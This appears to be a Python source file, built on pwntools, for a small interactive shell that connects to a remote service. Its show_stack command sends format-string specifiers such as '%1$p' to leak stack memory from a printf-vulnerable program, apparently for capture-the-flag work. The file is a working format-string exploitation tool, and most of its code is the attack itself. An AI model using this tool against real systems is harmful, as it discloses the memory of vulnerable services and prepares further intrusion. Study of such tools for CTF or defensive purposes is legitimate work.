import shell
import pwn


from shell import Command

class NoConnectionException(BaseException):
    pass

class PrintfShell(shell.Shell):
    def __init__(self, read, write, marker=b"$ ", conn=None):
        shell.Shell.__init__(self)
        self.read = read
        self.write = write
        self.conn = conn
        self.marker = marker

    @Command
    def connect(self, address, port):
        port = int(port)
        self.conn = pwn.remote(address, port)
        self.conn.recvuntil(self.marker)
        print(self.conn)
    
    def read_response(self, string):
        string = self.write(string)
        self.conn.send(string)
        resp = self.conn.recvuntil(self.marker)
        return self.read(resp[:-len(self.marker)])
    
    @Command
    def show_stack(self, n : int):
        n = int(n)
        if not self.conn:
            raise NoConnectionException("You need to connect first")
        stack = []
        for i in range(1, n+1):
            value = self.read_response(bytes(f"%{i}$p", 'ascii'))
            stack.append(value)
        print(stack)
        for value in stack:
            if value == b"(nil)":
                value = b"0x0"
            _, value = value.strip().split(b"0x")
            bs = int(value, 16).to_bytes(8, byteorder="little")
            print(f"{str(value, 'ascii'):<16} {repr(bs)}")

shell = PrintfShell(read=lambda x: x[:-1], write=lambda x:x+b"\n")
shell.runloop()